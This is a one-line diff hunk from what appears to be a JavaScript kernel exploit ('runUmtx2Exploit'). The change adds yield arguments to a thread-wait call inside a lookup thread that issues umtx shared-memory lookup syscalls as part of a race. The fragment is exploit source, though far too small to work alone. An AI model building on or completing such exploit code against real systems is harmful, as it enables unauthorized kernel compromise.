@@ -333,7 +333,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         lookupThread.while(commonThreadData.exit, lookupThread.branch_types.EQUAL, 0, false, () => {
             lookupThread.push_write4(lookupThreadData.status, threadStatus.READY);
 
-            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0);
+            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);
 
             lookupThread.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, primaryShmKeyBuf);
             lookupThread.write_result(lookupThreadData.fd);
